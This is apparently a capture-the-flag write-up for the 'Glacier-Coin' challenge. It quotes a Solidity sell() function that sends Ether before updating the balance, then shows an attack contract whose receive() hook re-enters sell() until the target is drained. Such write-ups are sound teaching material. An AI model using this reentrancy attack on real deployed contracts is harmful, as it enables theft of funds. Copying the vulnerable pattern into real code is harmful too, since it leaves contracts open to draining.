# Glacier-Coin

The solution is a reentrancy vulnerability in the `sell()` function

```solidity
function sell(uint256 amount) public
    {
        require(balances[msg.sender] >= amount, "You can not sell this much as you are poor af");
        uint256 new_balance = balances[msg.sender] - amount;
        (msg.sender).call{value: amount}("");
        balances[msg.sender] = new_balance;
    }
```

We can reenter it with:
```solidity
function attack() external payable
    {
        require(msg.value == 10 ether);
        target.buy{value: 10 ether}();
        target.sell(10 ether);
        owner.call{value: 20 ether}("");
    }   

    receive() external payable
    {
        // Reenter
        if (address(target).balance != 0) {
            target.sell(10 ether);
        }
    }
```
See Solve.sol for the full solution
